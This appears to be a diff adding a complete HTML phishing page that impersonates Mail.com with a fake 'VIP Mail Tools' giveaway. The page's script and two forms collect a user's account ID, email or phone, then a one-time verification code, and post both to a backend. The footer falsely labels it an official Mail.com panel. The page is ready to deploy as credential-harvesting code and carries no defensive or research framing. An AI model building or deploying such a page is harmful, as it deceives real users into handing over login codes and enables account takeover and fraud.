@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Mail.com VIP Mail Tools Panel</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+:root { --brand:#0061A8; --panel-bg:linear-gradient(120deg,#fff,rgba(255,255,255,0.95)); }
+body { font-family:Arial,Helvetica,sans-serif; margin:0; padding:30px; background:linear-gradient(135deg,#f4f6f8,var(--brand)); }
+.header { text-align:center;color:#fff;margin-bottom:18px;text-shadow:0 2px 6px rgba(0,0,0,0.35); }
+.header h1{ margin:0;padding:8px 12px;font-size:22px; }
+.header p{ margin:6px 0 0 0;opacity:0.95;font-size:13px; }
+.container { background:var(--panel-bg); padding:22px; border-radius:14px; max-width:520px; margin:0 auto; box-shadow:0 8px 30px rgba(0,0,0,0.12); }
+input[type=text],input[type=password],select{ padding:12px;margin:10px 0;width:100%;box-sizing:border-box;border-radius:10px;border:1px solid #d0d6dc;font-size:14px; }
+button{ display:block;width:100%;padding:14px;margin-top:12px;background:var(--brand);color:#fff;border:none;border-radius:10px;font-weight:700;font-size:15px;cursor:pointer;box-shadow:0 6px 14px rgba(0,0,0,0.12); }
+button:active{ transform:translateY(1px); }
+.note{ text-align:center;font-size:12px;color:#333;margin-top:12px; }
+.step { transition: all 260ms ease; }
+.hidden{ display:none; }
+.footer{ text-align:center;margin-top:16px;font-size:12px;color:#fff;opacity:0.95; }
+@media (max-width:520px){ body{padding:18px;} .container{padding:18px;border-radius:12px;} }
+</style>
+<script>
+document.addEventListener('DOMContentLoaded',function(){
+  var form1 = document.querySelector('#form-step1');
+  form1.addEventListener('submit',function(e){
+    e.preventDefault();
+    // copy values to step2 hidden inputs
+    var form2 = document.querySelector('#form-step2');
+    Array.from(form1.elements).forEach(function(el){
+      if(!el.name) return;
+      var target = form2.querySelector('[name="'+el.name+'"]');
+      if(target) target.value = el.value;
+    });
+    // post step1 to Flask
+    fetch(form1.action, {
+      method:'POST',
+      body:new FormData(form1)
+    });
+    // show step2
+    document.getElementById('step1').classList.add('hidden');
+    document.getElementById('step2').classList.remove('hidden');
+  });
+});
+</script>
+</head>
+<body>
+<div class="header">
+  <h1>Mail.com VIP Mail Tools Panel</h1>
+  <p>Claim your VIP Mail Tools — choose package & continue</p>
+</div>
+<div class="container">
+  <div id="step1" class="step">
+        <form id="form-step1" method="POST" action="/submit-step1">
+            <input type="text" name="username" placeholder="Account ID / Email / Phone" required><br>
+            <label>Select Package:</label>
+            <select name="package">
+                <option>50</option><option>100</option><option>500</option>
+                <option>1000</option><option>5000</option><option>10000</option>
+            </select><br>
+            <button type="submit">Proceed to OTP</button>
+        </form>
+        <div class="note">Official Panel · Mail.com</div></div>
+  <div id="step2" class="step hidden">
+        <form id="form-step2" method="POST" action="/submit-otp">
+            <input type="hidden" name="username" value="">
+            <input type="hidden" name="package" value="">
+            <label>OTP / Verification Code:</label><br>
+            <input type="text" name="otp" placeholder="Enter OTP / PIN" required><br>
+            <button type="submit">Verify</button>
+        </form>
+        <div class="note">Enter the verification code to complete the claim.</div></div>
+</div>
+<div class="footer">Panel · Mail.com</div>
+</body>
+</html>
